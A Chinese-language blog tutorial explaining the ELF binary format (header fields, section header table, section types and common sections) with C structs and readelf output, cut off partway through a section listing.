    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2></blockquote><p>在写PE结构解析的时候，以为ELF结构没必要去看文件结构，直到后面做了PWN题发现不是这样的，所有还是学习下ELF结构，然后再写个解析器</p><blockquote><h2 id="常见结构区分"><a href="#常见结构区分" class="headerlink" title="常见结构区分"></a>常见结构区分</h2></blockquote><p>目前，PC平台流行的可执行文件格式（Executable）主要包含如下两种，它们都是<strong>COFF</strong>（Common File Format）格式的变种</p><ul><li>Windows下的<strong>PE</strong>（Portable Executable）</li><li>Linux下的<strong>ELF</strong>（Executable Linkable Format）</li></ul><p><strong>源代码经过编译后但未进行连接的那些中间文件</strong>（Windows的<code>.obj</code>和Linux的<code>.o</code>），它与可执行文件的格式非常相似，所以一般跟可执行文件格式一起采用同一种格式存储。</p><p>其中动态链接库（<strong>DDL，Dynamic Linking Library</strong>）和静态链接库（<strong>Static Linking Library</strong>）的格式都和当前系统对应的可执行文件结构一样</p><ul><li>动态链接库：Windows的<code>.dll</code>、Linux的<code>.so</code></li><li>静态链接库：Windows的<code>.lib</code>、Linux的<code>.a</code></li></ul><blockquote><h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF"></a>ELF</h2></blockquote><h3 id="文件格式"><a href="#文件格式" class="headerlink" title="文件格式"></a>文件格式</h3><p>ELF文件有三种类型，可以通过ELF Header中的<code>e_type</code>成员进行区分：</p><ul><li><strong>可重定位文件（Relocatable File）</strong>：<code>ETL_REL</code>。一般为<code>.o</code>文件，可以与其他目标文件链接来创建可执行文件或共享目标文件的代码和数据。静态链接库属于可重定位文件</li><li><strong>可执行文件（Executable File）</strong>：<code>ET_EXEC</code>。可以执行的一个程序，此文件规定了exec()如何创建一个程序的进程映像。</li><li>共享目标文件（Shared Object File）：<code>ET_DYN</code>。一般为<code>.so</code>文件。<ul><li>链接器将其与其他可重定位文件、共享目标文件链接成新的目标文件；</li><li>动态链接器（Dynamic Linker）将其与某个可执行文件或其他共享目标文件结合一个可执行文件，创建进程映像。</li></ul></li></ul><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/ELF/1.png" alt="img"></p><p>如图所示，为ELF文件的基本结构，主要由四部分组成：</p><ul><li>ELF Header</li><li>ELF Program Header Table（或称Program Headers、程序头）</li><li>ELF Section Header Table（或称Section Headers、节头表）</li><li>ELF Section</li></ul><p>从图中，就能看出它们各自的数据结构以及相互之间的索引关系。下面依次介绍。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/ELF/2.png" alt="png"></p><p>段（<code>Segment</code>）与节（<code>Section</code>）的区别在于，段是程序执行的必要组成，当多个目标文件链接成一个可执行文件时，会将相同权限的节合并到一个段中。相比而言，节的粒度更小。</p><hr><h3 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h3><p>文件的最开始几个字节给出如何解释文件的提示信息。 这些信息独立于处理器， 也独立于文件中的其余内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT 16</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT]; <span class="comment">//magic number</span></span><br><span class="line">Elf32_Half e_type;                <span class="comment">//Ojbect file type</span></span><br><span class="line">Elf32_Half e_machine;             <span class="comment">//Architecture</span></span><br><span class="line">Elf32_Word e_version;             <span class="comment">//Object file version </span></span><br><span class="line">Elf32_Addr e_entry;               <span class="comment">//entry point</span></span><br><span class="line">Elf32_Off  e_phoff;               <span class="comment">//程序头内容在文件的偏移量</span></span><br><span class="line">Elf32_off  e_shoff;               <span class="comment">//段头内容在文件的偏移量</span></span><br><span class="line">Elf32_Word e_flags;</span><br><span class="line">Elf32_Half e_ehsize;              <span class="comment">//elf头部大小</span></span><br><span class="line">Elf32_Half e_phentsize;           <span class="comment">//程序头部表格的表项大小</span></span><br><span class="line">Elf32_Half e_phnum;               <span class="comment">//程序头的个数Program header</span></span><br><span class="line">Elf32_Half e_shentsize;           <span class="comment">//节区头部表格的表项大小</span></span><br><span class="line">Elf32_Half e_shnum;               <span class="comment">//段头的个数Section header</span></span><br><span class="line">Elf32_Half e_shstrndx;            <span class="comment">//String段在整个段列表中的索引值</span></span><br><span class="line">&#125;Elf32_Ehdr;</span><br></pre></td></tr></table></figure><h4 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h4><h5 id="e-ident"><a href="#e-ident" class="headerlink" title="e_ident"></a>e_ident</h5><p>数组给出了ELF的一些标识信息，这个数组中不同下标的含义如表所示：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/ELF/3.png" alt="png"></p><p>这些索引访问包含以下数值的字节：</p><ul><li><p>EI_MAG0 到 EI_MAG3：<strong>魔数（Magic Number）</strong>，标志此文件是一个ELF目标文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">名称            取值         位置</span><br><span class="line">EI_MAG0        0x7f       e_ident[EI_MAG0]</span><br><span class="line">EI_MAG1        &#39;E&#39;        e_ident[EI_MAG1]</span><br><span class="line">EI_MAG2        &#39;L&#39;        e_ident[EI_MAG2]</span><br><span class="line">EI_MAG3        &#39;F&#39;        e_ident[EI_MAG3]</span><br></pre></td></tr></table></figure></li><li><p>EI_CLASS：标识文件的类别，或者说，容量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">名称             取值            位置</span><br><span class="line">ELFCLASSNONE     0            非法类别</span><br><span class="line">ELFCLASS32       1            32位目标</span><br><span class="line">ELFCLASS64       2            64位目标</span><br><span class="line">ps:ELFCLASS32支持虚存范围4GB，ELFCLASS64是为64位预留的，不过文件中的其他内容都没有针对64位定义</span><br></pre></td></tr></table></figure></li><li><p>EI_DATA：字节e_ident[EI_DATA] 给出处理器特定数据的数据编码方式。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">名称            取值              位置</span><br><span class="line">ELFDATANONE     0             非法数据编码</span><br><span class="line">ELFDATA2LSB     1             高位在前</span><br><span class="line">ELFDATA2MSB     2             低位在前</span><br></pre></td></tr></table></figure></li><li><p>EI_VERSION：ELF头部的版本号码，目前此值必须是EV_CURRENT。</p></li><li><p>EI_PAD：标记e_ident中未使用字节的开始，初始化为0。</p></li></ul><hr><h5 id="e-type"><a href="#e-type" class="headerlink" title="e_type"></a>e_type</h5><p>目标文件类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">名称            取值          含义</span><br><span class="line">ET_NONE         0         未知目标文件格式</span><br><span class="line">ET_REL          1         可重定位文件</span><br><span class="line">ET_EXEC         2         可执行文件</span><br><span class="line">ET_DYN          3         共享目标文件</span><br><span class="line">ET_CORE         4         Core文件（转储格式）</span><br><span class="line">ET_LOPROC     0xff00      特定处理器文件</span><br><span class="line">ET_HIPROC     0xffff      特定处理器文件</span><br><span class="line">ps:ET_LOPROC和ET_HIPROC之间的取值用来标识与处理器相关的文件格式</span><br></pre></td></tr></table></figure><hr><h5 id="e-machine"><a href="#e-machine" class="headerlink" title="e_machine"></a>e_machine</h5><p>给出文件的目标体系结构类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">名称            取值          含义</span><br><span class="line">EM_NONE         0           未指定</span><br><span class="line">EM_M32          1           AT&amp;T WE 32100</span><br><span class="line">EM_SPARC        2           SPARC</span><br><span class="line">EM_386          3           Intel 80386</span><br><span class="line">EM_68K          4           Motorola 68000</span><br><span class="line">EM_88K          5           Motorola 88000</span><br><span class="line">EM_860          7           Intel 80860</span><br><span class="line">EM_MIPS         8           MIPS RS3000</span><br><span class="line">ps:其他值都是保留的。特定处理器的ELF名称会使用机器名来进行区分。</span><br></pre></td></tr></table></figure><hr><h5 id="e-version"><a href="#e-version" class="headerlink" title="e_version"></a>e_version</h5><p>目标文件版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">名称            取值          含义</span><br><span class="line">  EV_NONE         0           非法版本</span><br><span class="line">  EV_CURRENT      1           当前版本</span><br></pre></td></tr></table></figure><hr><h5 id="e-entry"><a href="#e-entry" class="headerlink" title="e_entry"></a>e_entry</h5><p>程序入口的虚拟地址，如果目标文件没有程序入口，可以为0</p><hr><h5 id="e-phoff"><a href="#e-phoff" class="headerlink" title="e_phoff"></a>e_phoff</h5><p>程序头部表格（Program Header Table）的偏移量（按字节计算）。如果文件没有程序头部表格，可以为0</p><hr><h5 id="e-shoff"><a href="#e-shoff" class="headerlink" title="e_shoff"></a>e_shoff</h5><p>节区头部表格（Section Header Table）的偏移量（按字节计算）。如果文件没有节区头部表格，可以为0</p><hr><h5 id="e-flags"><a href="#e-flags" class="headerlink" title="e_flags"></a>e_flags</h5><p>保存与文件相关的，特定于处理器的标志。标志名称采用EF_machine_flag的格式</p><hr><h5 id="e-ehsize"><a href="#e-ehsize" class="headerlink" title="e_ehsize"></a>e_ehsize</h5><p>ELF头部的大小（以字节计算）</p><hr><h5 id="e-phentsize"><a href="#e-phentsize" class="headerlink" title="e_phentsize"></a>e_phentsize</h5><p>程序头部表格的表项大小（按字节计算）</p><hr><h5 id="e-phnum"><a href="#e-phnum" class="headerlink" title="e_phnum"></a>e_phnum</h5><p>程序头部表格的表项数目。可以为0</p><hr><h5 id="e-shentsize"><a href="#e-shentsize" class="headerlink" title="e_shentsize"></a>e_shentsize</h5><p>节区头部表格的表项大小（按字节计算）</p><hr><h5 id="e-shnum"><a href="#e-shnum" class="headerlink" title="e_shnum"></a>e_shnum</h5><p>节区头部表格的表项数目。可以为0</p><hr><h5 id="e-shstrndx"><a href="#e-shstrndx" class="headerlink" title="e_shstrndx"></a>e_shstrndx</h5><p>节区头部表格中与节区名称字符串表相关的表项的索引。如果文件没有节区名称字符串表，此参数可以为SHN_UNDEF</p><h4 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Linux ubuntu 5.4.0-55-generic #61-Ubuntu SMP Mon Nov 9 20:49:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">ascotbe@ubuntu:~$ readelf -h /bin/sh</span><br><span class="line">ELF Header:</span><br><span class="line">  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  Class:                             ELF64</span><br><span class="line">  Data:                              2<span class="string">&#x27;s complement, little endian</span></span><br><span class="line"><span class="string">  Version:                           1 (current)</span></span><br><span class="line"><span class="string">  OS/ABI:                            UNIX - System V</span></span><br><span class="line"><span class="string">  ABI Version:                       0</span></span><br><span class="line"><span class="string">  Type:                              DYN (Shared object file)</span></span><br><span class="line"><span class="string">  Machine:                           Advanced Micro Devices X86-64</span></span><br><span class="line"><span class="string">  Version:                           0x1</span></span><br><span class="line"><span class="string">  Entry point address:               0x5cd0</span></span><br><span class="line"><span class="string">  Start of program headers:          64 (bytes into file)</span></span><br><span class="line"><span class="string">  Start of section headers:          127896 (bytes into file)</span></span><br><span class="line"><span class="string">  Flags:                             0x0</span></span><br><span class="line"><span class="string">  Size of this header:               64 (bytes)</span></span><br><span class="line"><span class="string">  Size of program headers:           56 (bytes)</span></span><br><span class="line"><span class="string">  Number of program headers:         13</span></span><br><span class="line"><span class="string">  Size of section headers:           64 (bytes)</span></span><br><span class="line"><span class="string">  Number of section headers:         30</span></span><br><span class="line"><span class="string">  Section header string table index: 29</span></span><br></pre></td></tr></table></figure><p>ELF文件结构示意图中定义的<code>ELF_Endr</code>的各个成员的含义与readelf具有对应关系：</p><table><thead><tr><th>成员</th><th>含义</th></tr></thead><tbody><tr><td>e_ident</td><td>Magic: 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00</td></tr><tr><td></td><td>class: ELF64</td></tr><tr><td></td><td>Data: 2’s complement, little endian</td></tr><tr><td></td><td>Version: 1 (current)</td></tr><tr><td></td><td>OS/ABI: UNIX - System V</td></tr><tr><td></td><td>ABI Version: 0</td></tr><tr><td>e_type</td><td>Type: DYN (Shared object file)</td></tr><tr><td></td><td>共享目标文件</td></tr><tr><td>e_machine</td><td>Advanced Micro Devices X86-64</td></tr><tr><td></td><td>ELF文件的CPI平台属性</td></tr><tr><td>e_version</td><td>Version: 0x1</td></tr><tr><td></td><td>ELF版本号。一般为常数1</td></tr><tr><td>e_entry</td><td>Entry point address: 0x5cd0</td></tr><tr><td></td><td>入口地址，规定ELF程序的入口虚拟地址，操作系统在加载完该程序后从这个地址开始执行进程的指令。</td></tr><tr><td>e_phoff</td><td>Start of program headers: 64 (bytes into file)</td></tr><tr><td>e_shoff</td><td>Start of section headers: 127896 (bytes into file)</td></tr><tr><td></td><td>Section Header Table 在文件中的偏移</td></tr><tr><td>e_word</td><td>Flags: 0x0</td></tr><tr><td></td><td>ELF标志位，用来标识一些ELF文件平台相关的属性</td></tr><tr><td>e_ehsize</td><td>Size of this header: 64(bytes)</td></tr><tr><td></td><td>ELF Header本身的大小</td></tr><tr><td>e_phentsize</td><td>Size of program headers:56 (bytes)</td></tr><tr><td>e_phnum</td><td>Number of program headers: 13</td></tr><tr><td>e_shentsize</td><td>Size of section headers: 64 (bytes)</td></tr><tr><td></td><td>单个Section Header大小</td></tr><tr><td>e_shnum</td><td>Number of section headers: 30</td></tr><tr><td></td><td>Section Header的数量</td></tr><tr><td>e_shstrndx</td><td>Section header string table index: 29</td></tr><tr><td></td><td>Section Header字符串在Section Header Table中的索引</td></tr></tbody></table><h3 id="ELF-Section-Header-Table"><a href="#ELF-Section-Header-Table" class="headerlink" title="ELF Section Header Table"></a>ELF Section Header Table</h3><p>ELF节头表是一个节头数组。每一个节头都描述了其所对应的节的信息，如节名、节大小、在文件中的偏移、读写权限等。<strong>编译器、链接器、装载器都是通过节头表来定位和访问各个节的属性的。</strong></p><p><code>e_shoff</code>成员给出从文件头到节区头部表格的偏移字节数；<code>e_shnum</code>给出表格中条目数目；<code>e_shentsize</code>给出每个项目的字节数。从这些信息中可以确切地定位节区的具体位置、长度。</p><p>节区头部表格中比较特殊的几个小标如下：</p><table><thead><tr><th>名称</th><th>取值</th><th>说明</th></tr></thead><tbody><tr><td>SHN_UNDEF</td><td>0</td><td>标记未定义的、缺失的、不相关的，或者没有含义的节区引用</td></tr><tr><td>SHN_LORESERVE</td><td>0xFF00</td><td>保留索引的下界</td></tr><tr><td>SHN_LOPROC</td><td>0xFF00</td><td>保留给处理器特殊的语义</td></tr><tr><td>SHN_HIPROC</td><td>0xFF1F</td><td>保留给处理器特殊的语义</td></tr><tr><td>SHN_ABS</td><td>0xFFF1</td><td>包含对应引用量的绝对取值。这些值不会被重定位所影响</td></tr><tr><td>SHN_COMMON</td><td>0xFFF2</td><td>相对于此节区定义的符号是公共符号。如FORTRAN中COMMON或者未分配的C外部变量</td></tr><tr><td>SHN_HIRESERVE</td><td>0xFFFF</td><td>保留索引的上界</td></tr></tbody></table><p>介于<code>SHN_LORESERVE</code>和<code>SHN_HIRESERVE</code>之间的表项不会出现在节区头部表中。</p><p>每个节区头部可用如下数据结构描述:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word sh_name;      <span class="comment">//给出节区名称。是节区头部字符串节区（Section Header String Table Section）的索引。名字是一个NULL结尾的字符串，保存在一个名为.shstrtab的字符串表（可通过Section Header索引到）</span></span><br><span class="line">    Elf32_Word sh_type;      <span class="comment">//节类型。为节区的内容和语义进行分类。</span></span><br><span class="line">    Elf32_Word sh_flags;     <span class="comment">//节标志位。节区支持1位形式的标志，这些标志描述了多种属性</span></span><br><span class="line">    Elf32_Addr sh_addr;      <span class="comment">//节的虚拟地址。如果节区将出现在进程的内存映像中或可被加载，则sh_addr为该节被加载后在进程地址空间中的虚拟地址，给出节区的每一个字节应处的位置。否则，此字段为0</span></span><br><span class="line">    Elf32_Off sh_offset;     <span class="comment">//节偏移。如果该节存在于文件中，则该节表示在文件中的偏移；否则无意义，如sh_offset对于BSS节来说就是没有意义的。即此成员的取值给出节区的第一个字节与文件头之间的偏移。</span></span><br><span class="line">    Elf32_Word sh_size;      <span class="comment">//节大小。此成员给出节区的长度（字节数）。除非节区的类型是SHT_NOBITS，否则节区占用文件中的sh_size字节。</span></span><br><span class="line">    Elf32_Word sh_link;      <span class="comment">//节链接信息。此成员给出节区头部表索引链接，其解释依赖于节区类型</span></span><br><span class="line">    Elf32_Word sh_info;      <span class="comment">//节链接信息。此成员给出附加信息，其解释依赖于节区类型</span></span><br><span class="line">    Elf32_Word sh_addralign; <span class="comment">//节地址对齐方式。某些节区带有地址对齐约束。</span></span><br><span class="line">    Elf32_Word sh_entsize;   <span class="comment">//节项大小。某些节区中包含固定大小的项目，如符号表，其包含的每个符号所在的大小都一样。</span></span><br><span class="line">&#125; Elf32_Shdr;</span><br></pre></td></tr></table></figure><p><strong>注意：索引为零（SHN_UNDFF）的节区头部也是存在的，尽管此索引标记的是未定义的节区引用，并且节区的内容固定</strong></p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/ELF/4.png" alt="png"></p><h4 id="部分字段解析"><a href="#部分字段解析" class="headerlink" title="部分字段解析"></a>部分字段解析</h4><h5 id="sh-type"><a href="#sh-type" class="headerlink" title="sh_type"></a>sh_type</h5><p>节名是一个字符串，只是在链接和编译过程中有意义，但它不能真正地表示节的类型。对于编译器和链接器来说，主要决定节的属性是节的类型（<code>sh_type</code>）和节的标志位（<code>sh_flags</code>）</p><p>节的类型相关常量以<code>SHT_</code>开头，上述<code>readelf -S</code>命令执行的结果省略了该前缀。节区类型定义如表：</p><table><thead><tr><th>名称</th><th>取值</th><th>说明</th></tr></thead><tbody><tr><td>SHT_NULL</td><td>0</td><td>此值标志节区头部是非活动的，没有对应的节区。（无效节）</td></tr><tr><td>SHT_PROGBITS</td><td>1</td><td><strong>程序节</strong>。此节区包含程序定义的信息，其格式和含义都有程序来解释，代码节、数据节都是这种类型</td></tr><tr><td>SHT_SYMTAB</td><td>2</td><td>此节区包含一个<strong>符号表</strong>。目前目标文件对每种类型的节区都只能包含一个，不过这个限制将来可能会发生变化。一般，SHT_SYMTAB节区提供用于链接编辑（指ld而言）的符号，尽管也可用来实现动态链接</td></tr><tr><td>SHT_STRTAB</td><td>3</td><td>此节区包含<strong>字符串表</strong>。目标文件可能包含多个字符串表节区</td></tr><tr><td>SHT_RELA</td><td>4</td><td>此节区包含<strong>重定位表项</strong>，其中可能会有补齐内容（addend），例如32位目标文件中的Elf32_Rela类型。目标文件可能拥有多个重定位节区</td></tr><tr><td>SHT_HASH</td><td>5</td><td>此节区包含<strong>符号哈希表</strong>。所有参与动态链接的目标都必须包含一个符号哈希表。目前，一个目标文件只能包含一个哈希表，不过此限制将来可能会解除</td></tr><tr><td>SHT_DYNAMIC</td><td>6</td><td>此节区包含动态链接的信息。目前一个目标文件中只能包含一个动态节区，将来可能会取消这一限制</td></tr><tr><td>SHT_NOTE</td><td>7</td><td>此节区包含以某种方式来标记文件的信息，即提示信息</td></tr><tr><td>SHT_NOBITS</td><td>8</td><td>表示该节在文件中没有内容，如<code>.bss</code>节。这种类型的节区不占用文件中的空间，其他方面和<code>SHT_PROGBITS</code>相似。尽管此节区不包含任何字节，成员<code>sh_offset</code>中还是会包含概念性的文件偏移</td></tr><tr><td>SHT_REL</td><td>9</td><td>此节区包含重定位表项，其中没有补齐（addends），例如32位目标文件中的Elf32_rel类型。目标文件中可以拥有多个重定位节区</td></tr><tr><td>SHT_SHLIB</td><td>10</td><td>此节区被保留，不过其语义是未规定的。包含此类型节区的程序与ABI不兼容</td></tr><tr><td>SHT_DYNSYM</td><td>11</td><td><strong>动态链接的符号表</strong>。作为一个完整的符号表，它可能包含很多对动态链接而言不必要的符号。因此，目标文件也可以包含一个SHT_DYNSYM节区，其中保存动态链接符号的一个最小集合，以节省空间</td></tr><tr><td>SHT_LOPROC</td><td>0x70000000</td><td>这一段（包含两个边界），是保留给处理器专用语义的</td></tr><tr><td>SHT_HIPROC</td><td>0x7FFFFFFF</td><td>这一段（包含两个边界），是保留给处理器专用语义的</td></tr><tr><td>SHT_LOUSER</td><td>0x80000000</td><td>此值给出保留给应用程序的索引下界</td></tr><tr><td>SHT_HIUSER</td><td>0x8FFFFFFF</td><td>此值给出保留给应用程序的索引上界</td></tr></tbody></table><hr><h5 id="sh-flags"><a href="#sh-flags" class="headerlink" title="sh_flags"></a>sh_flags</h5><p>sh_flags字段定义了一个节区中包含的内容是否可以修改、是否可以执行等消息。如果一个标志位被设置，则该位取值为1。未定义的各位都设置为0。</p><table><thead><tr><th>名称</th><th>取值</th><th>含义</th></tr></thead><tbody><tr><td>SHF_WRITE</td><td>0x1</td><td>表示该节在进程空间中可写</td></tr><tr><td>SHF_ALLOC</td><td>0x2</td><td>表示该节在进程空间中需要分配空间。有些包含指示或控制信息的节不需要在进程空间中分配空间，就不会有这个标志。</td></tr><tr><td>SHF_EXECINSTR</td><td>0x4</td><td>表示该节在进程空间中可以被执行</td></tr><tr><td>SHF_MASKPROC</td><td>0xF0000000</td><td></td></tr></tbody></table><p>其中已经定义了的各位含义如下：</p><ul><li>SHF_WRITE：节区包含进程执行过程中将可写的数据</li><li>SHF_ALLOC：此节区在进程执行中占用内存。某些控制节区并不出现于目标文件的内存映像中，对于那些节区，此位应设置为0</li><li>SHF_EXECINSTR：节区包含可执行的机器指令</li><li>SHF_MASKPROC：所有包含于此掩码中的四位都用于处理器专用的语义</li></ul><hr><h5 id="sh-link和sh-info"><a href="#sh-link和sh-info" class="headerlink" title="sh_link和sh_info"></a>sh_link和sh_info</h5><p>如果节的类型是与链接有关的（无论是动态链接还是静态链接），如<strong>重定位表、符号表</strong>等，则<code>sh_link</code>、<code>sh_info</code>两个成员所包含的意义如下所示。其它类型的节中这两个成员没有意义。</p><p>根据节区类型的不同，sh_link和sh_info的具体含义也有所不同：</p><p><img src="http://cdn.peckerwood.top/3-4-1.png" alt="png"></p><hr><h3 id="ELF-Sections"><a href="#ELF-Sections" class="headerlink" title="ELF Sections"></a>ELF Sections</h3><h4 id="节的分类"><a href="#节的分类" class="headerlink" title="节的分类"></a>节的分类</h4><p><strong>.text</strong></p><p><code>.text</code>节是保存了程序代码指令的代码节。一段可执行程序，如果存在Phdr，则<code>.text</code>节就会存在于<code>text</code>段中。由于<code>.text</code>节保存了程序代码，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.rodata</strong></p><p><code>.rodata</code>节保存了只读的数据，如一行c语言代码中的字符串。由于<code>.rodata</code>节是只读的，所以只能存在于一个可执行文件的<strong>只读段</strong>中。因此，只能在<code>text</code>段（而不是<code>data</code>段）中找到<code>.rodata</code>节。由于<code>.rodata</code>节是只读的，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.plt</strong></p><p><code>.plt</code>节也称为<strong>过程链接表（Procedure Linkage Table）</strong>，其包含了动态链接器调用从共享库导入的函数所必需的相关代码。由于<code>.plt</code>节保存了代码，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.data</strong></p><p><code>.data</code>节存在于<code>data</code>段中，<strong>其保存了初始化的全局变量等数据</strong>。由于<code>.data</code>节保存了程序的变量数据，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.bss</strong></p><p><code>.bss</code>节存在于<code>data</code>段中，占用空间不超过4字节，仅表示这个节本来的空间。<code>.bss</code>节保存了未进行初始化的全局数据。程序加载时数据被初始化为0，在程序执行期间可以进行赋值。由于<code>.bss</code>节未保存实际的数据，所以节类型为<code>SHT_NOBITS</code>。</p><p><strong>.got.plt</strong></p><p><code>.got</code>节保存了全局偏移量。<code>.got</code>节和<code>.plt</code>节一起提供了对导入的共享库函数的访问入口，由动态链接器在运行时进行修改。由于<code>.got .plt</code>节与程序执行有关，所以节类型为<code>SHT_PROGBITS</code>。</p><p><strong>.dynsym</strong></p><p><code>.dynsym</code>节保存在<code>text</code>段中。其保存了从共享库导入的动态符号表。节类型为<code>SHT_DYNSYM</code>。</p><p><strong>.dynstr</strong></p><p><code>.dynstr</code>保存了动态链接字符串表，表中存放了一系列字符串，这些字符串代表了符号名称，以空字符作为终止符。</p><p><strong>.rel.name .relaname</strong></p><p>name根据重定位所适用的节区给定。例如<code>.text</code>节区的重定位节区名字将是：<code>.rel.text</code>或者<code>.rela.text</code>。重定位表保存了重定位相关的信息，这些信息描述了如何在链接或运行时，对ELF目标文件的某些部分或者进程镜像进行补充或者修改。由于重定位表保存了重定位相关的数据，所以节类型为<code>SHT_REL</code>。</p><p><strong>.hash</strong></p><p><code>.hash</code>节也称为<code>.gnu.hash</code>，其保存了一个用于查找符号的散列表。</p><p><strong>.symtab</strong></p><p><code>.symtab</code>节是一个<code>ElfN_Sym</code>的数组，保存了符号信息。节类型为<code>SHT_SYMTAB</code>。</p><p><strong>.strtab</strong></p><p><code>.strtab</code>节保存的是符号字符串表，表中的内容会被<code>.symtab</code>的<code>ElfN_Sym</code>结构中的<code>st_name</code>引用。节类型为<code>SHT_STRTAB</code>。</p><p><strong>.ctors&amp;.dtors</strong></p><p><code>ctors</code>（构造器）节和<code>.dtors</code>（析构器）节分别保存了指向构造函数和析构函数的函数指针，构造函数是在main函数执行之前需要执行的代码；析构函数是在main函数之后需要执行的代码。</p><p>我们可以使用readelf工具来查看节头表。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">ascotbe@ubuntu:~$ readelf -S /bin/sh</span><br><span class="line">There are 30 section headers, starting at offset 0x1f398:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  